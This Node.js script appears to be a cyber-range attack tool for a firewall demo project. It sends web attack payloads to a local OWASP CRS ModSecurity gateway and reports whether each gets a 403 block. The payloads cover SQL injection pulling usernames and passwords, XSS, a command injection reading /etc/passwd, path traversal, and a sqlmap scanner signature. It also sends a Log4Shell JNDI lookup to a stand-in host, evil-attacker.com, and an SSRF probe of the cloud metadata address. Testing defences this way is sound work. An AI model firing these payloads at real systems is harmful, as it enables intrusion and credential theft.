#!/usr/bin/env node
/**
 * ═══════════════════════════════════════════════════════════════════════════════
 *  AAPKI NAZAR: LIVE ATTACKER CLI & CYBER RANGE TOOL
 *  Sends authentic Layer-7 Web Exploits against:
 *    1. Official OWASP CRS Gateway (Docker Nginx-ModSec on port 8080)
 *    2. Aapki Nazar Host Gateway (Node.js on port 3001)
 *  Demonstrates: Real Attack -> OWASP CRS Evaluation -> HTTP 403 Block -> SOC Ingestion!
 * ═══════════════════════════════════════════════════════════════════════════════
 *
 *  Usage:
 *    node attack.js --target crs --type sqli
 *    node attack.js --target crs --type xss
 *    node attack.js --target crs --type cmdi
 *    node attack.js --target crs --type lfi
 *    node attack.js --target crs --type scanner
 *    node attack.js --target crs --type clean
 *    node attack.js --target crs --all
 *
 *  Options:
 *    --target <crs|soc>   Target CRS (port 8080, default) or SOC (port 3001)
 *    --type <vector>      sqli, xss, cmdi, log4j, ssrf, lfi, scanner, bruteforce, clean
 *    --ip <ip>            Simulated attacker IP (default: 198.51.100.44)
 *    --port <port>        Override destination port
 *    --host <host>        Override destination host (default: 127.0.0.1)
 *    --all                Execute all vectors sequentially
 */

const http = require("http");

// ANSI Terminal Colors
const RESET = "\x1b[0m";
const BOLD = "\x1b[1m";
const RED = "\x1b[31m";
const GREEN = "\x1b[32m";
const YELLOW = "\x1b[33m";
const BLUE = "\x1b[34m";
const MAGENTA = "\x1b[35m";
const CYAN = "\x1b[36m";
const WHITE = "\x1b[37m";
const BG_RED = "\x1b[41m";
const BG_GREEN = "\x1b[42m";

const args = process.argv.slice(2);
let attackType = "sqli";
let targetMode = "crs"; // "crs" (8080) or "soc" (3001)
let targetHost = "127.0.0.1";
let targetPort = null;
let clientIp = "198.51.100.44";
let sessionId = null;
let runAll = false;

for (let i = 0; i < args.length; i++) {
  if (args[i] === "--type" && args[i + 1]) {
    attackType = args[i + 1].toLowerCase();
    i++;
  } else if (args[i] === "--target" && args[i + 1]) {
    targetMode = args[i + 1].toLowerCase();
    i++;
  } else if (args[i] === "--ip" && args[i + 1]) {
    clientIp = args[i + 1];
    i++;
  } else if (args[i] === "--session" && args[i + 1]) {
    sessionId = args[i + 1];
    i++;
  } else if (args[i] === "--port" && args[i + 1]) {
    targetPort = parseInt(args[i + 1], 10);
    i++;
  } else if (args[i] === "--host" && args[i + 1]) {
    targetHost = args[i + 1];
    i++;
  } else if (args[i] === "--all") {
    runAll = true;
  }
}

if (!sessionId) {
  sessionId = `sim-run-${Date.now().toString().slice(-6)}-${Math.floor(Math.random() * 1000)}`;
}

if (!targetPort) {
  targetPort = targetMode === "soc" ? 3001 : 8080;
}

const isCrsMode = targetPort === 8080 || targetMode === "crs";

function getVector(key) {
  const prefix = isCrsMode ? "" : "/api/waf";

  const map = {
    sqli: {
      name: "SQL Injection (Union-Based / Boolean Extraction)",
      ruleId: "OWASP-CRS-942100",
      mitre: "T1190 (Exploit Public-Facing Application: SQLi)",
      method: "GET",
      path: `${prefix}/products?search=` + encodeURIComponent("' UNION SELECT null, username, password FROM users WHERE '1'='1 --"),
      payload: "' UNION SELECT null, username, password FROM users WHERE '1'='1 --",
      headers: { "User-Agent": "Aapki-Nazar-Attacker-CLI/1.0" }
    },
    xss: {
      name: "Cross-Site Scripting (DOM Injection & Cookie Probe)",
      ruleId: "OWASP-CRS-941100",
      mitre: "T1059.007 (Command and Scripting: JavaScript)",
      method: "GET",
      path: `${prefix}/products?search=` + encodeURIComponent("<script>alert('Aapki-Nazar-XSS-Execution')</script>"),
      payload: "<script>alert('Aapki-Nazar-XSS-Execution')</script>",
      headers: { "User-Agent": "Aapki-Nazar-Attacker-CLI/1.0" }
    },
    cmdi: {
      name: "Remote Command Injection (Reverse Shell / Token Pipe)",
      ruleId: "OWASP-CRS-932100",
      mitre: "T1059 (Command and Scripting Interpreter: CMDi)",
      method: "GET",
      path: `${prefix}/products?search=` + encodeURIComponent("; cat /etc/passwd | whoami"),
      payload: "; cat /etc/passwd | whoami",
      headers: { "User-Agent": "Aapki-Nazar-Attacker-CLI/1.0" }
    },
    lfi: {
      name: "Path Traversal & Sensitive Local File Access",
      ruleId: "OWASP-CRS-930100",
      mitre: "T1083 (File and Directory Discovery)",
      method: "GET",
      path: `${prefix}/products?search=` + encodeURIComponent("../../../../etc/passwd"),
      payload: "../../../../etc/passwd",
      headers: { "User-Agent": "Aapki-Nazar-Attacker-CLI/1.0" }
    },
    scanner: {
      name: "Automated Vulnerability Scanner Probe (Sqlmap)",
      ruleId: "OWASP-CRS-913100",
      mitre: "T1595 (Active Scanning: Vulnerability Scanners)",
      method: "GET",
      path: `${prefix}/products?search=test&id=1`,
      payload: "User-Agent: sqlmap/1.7#stable (https://sqlmap.org)",
      headers: { "User-Agent": "sqlmap/1.7#stable (https://sqlmap.org)" }
    },
    log4j: {
      name: "Log4Shell & JNDI Remote Code Execution Probe",
      ruleId: "OWASP-CRS-944100",
      mitre: "T1190 (CVE-2021-44228: Log4Shell)",
      method: "POST",
      path: `${prefix}/login`,
      payload: "${jndi:ldap://evil-attacker.com:1389/Exploit}",
      headers: {
        "User-Agent": "${jndi:ldap://evil-attacker.com:1389/Exploit}",
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ username: "admin", probe: "${jndi:ldap://evil-attacker.com:1389/Exploit}" })
    },
    ssrf: {
      name: "Server-Side Request Forgery (AWS Cloud IMDS Probe)",
      ruleId: "OWASP-CRS-934100",
      mitre: "T1090 (Proxy: Multi-Protocol SSRF)",
      method: "GET",
      path: isCrsMode ? `/products?search=` + encodeURIComponent("http://169.254.169.254/latest/meta-data/") : `/api/waf/fetch-url?url=` + encodeURIComponent("http://169.254.169.254/latest/meta-data/"),
      payload: "http://169.254.169.254/latest/meta-data/",
      headers: { "User-Agent": "Aapki-Nazar-Attacker-CLI/1.0" }
    },
    clean: {
      name: "Benign User Traffic (E-Commerce Catalog Browsing)",
      ruleId: "N/A (Standard Benign HTTP)",
      mitre: "None",
      method: "GET",
      path: `${prefix}/products?search=` + encodeURIComponent("wireless noise-canceling headphones"),
      payload: "wireless noise-canceling headphones",
      headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }
    }
  };

  return map[key] || null;
}

function sendRequest(options, data) {
  return new Promise((resolve, reject) => {
    const req = http.request(options, (res) => {
      let body = "";
      res.on("data", (chunk) => { body += chunk; });
      res.on("end", () => {
        resolve({ statusCode: res.statusCode, headers: res.headers, body });
      });
    });

    req.on("error", (err) => {
      reject(err);
    });

    if (data) req.write(data);
    req.end();
  });
}

async function executeAttack(typeKey) {
  const vector = getVector(typeKey);
  if (!vector) {
    console.error(`${RED}Error: Unknown attack type '${typeKey}'.${RESET}`);
    console.log(`Available types: sqli, xss, cmdi, lfi, scanner, log4j, ssrf, clean`);
    return;
  }

  const engineLabel = isCrsMode ? "OFFICIAL OWASP CRS (DOCKER / NGINX / MODSECURITY)" : "AAPKI NAZAR HOST GATEWAY";

  console.log(`\n${CYAN}──────────────────────────────────────────────────────────────────────${RESET}`);
  console.log(`${BOLD}${WHITE}CYBER RANGE TARGET:   ${YELLOW}${engineLabel}${RESET}`);
  console.log(`${BOLD}${WHITE}ATTACK VECTOR:        ${MAGENTA}${vector.name.toUpperCase()}${RESET}`);
  console.log(`${CYAN}──────────────────────────────────────────────────────────────────────${RESET}`);
  console.log(`  ${BOLD}Target URL:${RESET}         ${vector.method} http://${targetHost}:${targetPort}${vector.path}`);
  console.log(`  ${BOLD}Simulated IP:${RESET}       ${WHITE}${clientIp}${RESET}`);
  console.log(`  ${BOLD}Simulation Session:${RESET} ${YELLOW}${sessionId}${RESET}`);
  console.log(`  ${BOLD}OWASP Rule Match:${RESET}   ${MAGENTA}${vector.ruleId}${RESET}`);
  console.log(`  ${BOLD}MITRE ATT&CK:${RESET}       ${CYAN}${vector.mitre}${RESET}`);
  console.log(`  ${BOLD}Injected Payload:${RESET}   ${WHITE}${vector.payload}${RESET}`);

  const headers = {
    ...vector.headers,
    "Host": `${targetHost}:${targetPort}`,
    "X-Forwarded-For": clientIp,
    "X-Simulation-IP": clientIp,
    "X-Simulation-Session": sessionId
  };
  if (vector.body) {
    headers["Content-Length"] = Buffer.byteLength(vector.body);
  }

  const reqOptions = {
    host: targetHost,
    port: targetPort,
    method: vector.method,
    path: vector.path,
    headers
  };

  try {
    const startTime = Date.now();
    const response = await sendRequest(reqOptions, vector.body);
    const elapsed = Date.now() - startTime;

    console.log(`\n  ${BOLD}Gateway Latency:${RESET}    ${elapsed} ms`);
    console.log(`  ${BOLD}HTTP Status Code:${RESET}   ${response.statusCode === 403 ? `${BG_RED}${WHITE} 403 FORBIDDEN ${RESET}` : (response.statusCode === 200 ? `${BG_GREEN}${WHITE} 200 OK ${RESET}` : `${YELLOW}${response.statusCode}${RESET}`)}`);

    if (response.statusCode === 403) {
      console.log(`\n${BG_RED}${WHITE}${BOLD} [BLOCKED] GENUINE OWASP CRS GATEWAY BLOCK ENFORCED! ${RESET}`);
      console.log(`${RED}  The ModSecurity v3 / OWASP Core Rule Set engine intercepted and rejected the attack.${RESET}`);
      console.log(`${RED}  HTTP Status:     403 Forbidden${RESET}`);
      console.log(`${RED}  Target Protected: Request was dropped before reaching backend application.${RESET}`);
      console.log(`${GREEN}  [CONFIRMED] Transaction logged in JSON audit log and ingested into Aapki Nazar SOC.${RESET}`);
    } else if (response.statusCode === 200) {
      if (typeKey === "clean") {
        console.log(`\n${GREEN}${BOLD} [PASSED] BENIGN TRAFFIC REACHED PROTECTED APPLICATION! ${RESET}`);
        console.log(`${GREEN}  Request successfully evaluated by OWASP CRS (0 anomaly score).${RESET}`);
        console.log(`${GREEN}  Protected store returned HTTP 200 OK.${RESET}`);
      } else {
        console.log(`\n${YELLOW}${BOLD} [WARNING] HTTP 200 OK RECEIVED (Detection-Only Mode)${RESET}`);
      }
    } else {
      console.log(`\n  Response (${response.statusCode}): ${response.body.substring(0, 200)}`);
    }
  } catch (err) {
    if (err.code === "ECONNREFUSED") {
      console.error(`\n${RED}[ERROR] Connection refused at http://${targetHost}:${targetPort}.${RESET}`);
      if (isCrsMode) {
        console.error(`${YELLOW}Please ensure the Docker WAF is running: 'docker compose up -d'.${RESET}`);
      } else {
        console.error(`${YELLOW}Please ensure Aapki Nazar backend is running: 'npm start'.${RESET}`);
      }
    } else {
      console.error(`\n${RED}Request failed: ${err.message}${RESET}`);
    }
  }
}

async function main() {
  console.log(`\n${BOLD}${BLUE}╔═════════════════════════════════════════════════════════════════════╗${RESET}`);
  console.log(`${BOLD}${BLUE}║        AAPKI NAZAR: LIVE ATTACKER CLI & CYBER RANGE                 ║${RESET}`);
  console.log(`${BOLD}${BLUE}║        Official OWASP CRS (v4.3) & Active SOAR Defense              ║${RESET}`);
  console.log(`${BOLD}${BLUE}╚═════════════════════════════════════════════════════════════════════╝${RESET}`);

  if (runAll) {
    const keys = ["clean", "sqli", "xss", "cmdi", "lfi", "scanner"];
    for (const key of keys) {
      await executeAttack(key);
      await new Promise(r => setTimeout(r, 1200));
    }
  } else {
    await executeAttack(attackType);
  }
  console.log(`\n`);
}

main();
